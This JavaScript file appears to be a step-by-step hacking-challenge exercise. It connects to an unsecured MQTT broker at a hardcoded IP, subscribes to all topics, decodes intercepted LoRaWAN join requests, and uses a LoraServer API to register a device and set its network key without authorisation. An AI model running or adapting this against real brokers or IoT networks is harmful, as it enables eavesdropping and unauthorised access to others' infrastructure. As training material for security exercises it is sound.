const api = require('./api/api');
const utils = require('./utils');
const conf = require('./conf/conf');
const mqtt = require('mqtt');
const Logger = require('./log/logger');

const JoinRequestPacketDecoder = require('./join-request-packet-decoder');

const gatewayRxTopicRegex = new RegExp("^gateway/([0-9a-fA-F]+)/rx$");

const appEUI = utils.hexStringToBytes(conf.user.appEUI);
const deviceEUI = utils.hexStringToBytes(conf.user.deviceEUI);
const deviceNetworkKey = utils.normalizeHexString(conf.user.nwkKey);

const logger = Logger.child({service: 'index'});

let client;

/**
 * Step 1
 */
let init = () => {

// TODO Step 1: Connect to the city's remote MQTT Broker
// Using the provided MQTT client, connect to the remote MQTT broker (cf README.md)
// Don't forget to manually set your clientId, otherwise your step wont be validated!
// Those idiots forgot to put any security on it... Noobs!
// MQTT Client documentation => https://github.com/mqttjs/MQTT.js
// You want to listen to all incoming messages... Did I hear the word "Wildcard"?
  client = mqtt.connect('mqtt://5.135.162.148:1883', {clientId: 'hacker-1234'});
  client.on('connect', () => {
    logger.info("Connected to broker!");
    client.subscribe("#");
  });
  client.on("message", onMessage);
};

/**
 * Step 2
 * @param topic
 * @param message
 */
let onMessage = async (topic, message) => {
  if (!gatewayRxTopicRegex.test(topic)) {
    return;
  }
  // TODO Step 2: 
  // We are only interested in the join request packets.
  // Problem is: those packets are encoded... Therefore we need to use a decoder.
  // You need to implement the PacketDecoder code of course!
  // How? RTFM => README.md
  let msgDecoder = new JoinRequestPacketDecoder(topic, message);
  if (!msgDecoder.isSupported()) {
    return;
  }
  logger.debug("Join Request identified");
  let decodedJoinRequest = msgDecoder.decode();
  logger.debug("Decoded:" + JSON.stringify(decodedJoinRequest));
  // Congratulations, you are decoding all the join requests of the LoRa network.
  // However, we want to be smart hackers and only activate your friend's device on the specific APP_EUI 
  if (isValidAppEUI(decodedJoinRequest.appEUI) && isRightDeviceEUI(decodedJoinRequest.devEUI)) {
    logger.debug("AppEUI and DevEUI are valid. Will register device");
    // TODO Step 3:
    // JoinRequest means the device is trying to join the application network.
    // Problem is : The device was never registered in the application network.
    // (It's like a new computer trying to go join a nazily-secured enterprise network 
    // and your sysadmin needs to whitelist your computer's mac address).
    // Therefore we want to interact with the LoraServer API.
    // Thanks to your awesome friend John Doe, you already have a async-client available in api/api.js
    // TODO Step 3.1: register your friend's device remotely
    try {
      if (!await api.deviceExists(decodedJoinRequest.devEUI)) {
        await api.createDevice({
          devEUI: decodedJoinRequest.devEUI,
          applicationID: conf.loRaServer.loRaApplicationId,
          deviceProfileID: conf.loRaServer.rak811DevProfileId,
          name: "Test",
          description: "Test description"
        });
      }
      // TODO Step 3.2: set the device Network key (NwkKey).
      await api.setDeviceNwkKey(decodedJoinRequest.devEUI, deviceNetworkKey);
      logger.debug("Device registered successfully");  
    } catch (e) {
      logger.error("Error occured during device registration:");
      logger.error(e);
    }
    
  }
};

/**
 * Check whether the AppEUI of the intercepted message is the one we want to work on
 * @param msgAppEUI {string|Uint8Array}
 * @returns {boolean}
 */
let isValidAppEUI = (msgAppEUI) => {
  return utils.arraysEqual((typeof msgAppEUI === 'string') ? utils.hexStringToBytes(msgAppEUI) : msgAppEUI, appEUI);
};

/**
 * Check whether the DeviceEUI equals the team's device.
 * If you don't implement this right, you might give a head start to all your competitors!
 * @param devEUI {string|Uint8Array}
 * @returns {boolean}
 */
let isRightDeviceEUI = (devEUI) => {
  return utils.arraysEqual((typeof devEUI === 'string') ? utils.hexStringToBytes(devEUI) : devEUI, deviceEUI);
};

init();